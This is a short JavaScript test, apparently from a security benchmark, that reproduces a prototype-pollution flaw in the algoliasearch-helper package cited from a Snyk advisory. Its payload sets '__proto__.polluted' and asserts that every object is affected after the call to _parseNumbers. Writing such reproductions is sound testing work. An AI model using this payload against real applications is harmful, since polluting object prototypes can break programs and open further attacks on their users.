//https://security.snyk.io/vuln/SNYK-JS-ALGOLIASEARCHHELPER-1570421
test("prototype pollution in algoliasearch-helper", () => {
  const algohelp = require("algoliasearch-helper");
  let payload = JSON.parse(process.env.SECBENCH_PAYLOAD || process.env.SECBENCH_PAYLOAD || '{"__proto__": {"polluted": "yes"}}');

  expect({}.polluted).toBe(undefined);

  algohelp.SearchParameters._parseNumbers(payload); // {}

  expect({}.polluted).toBe("yes");
});
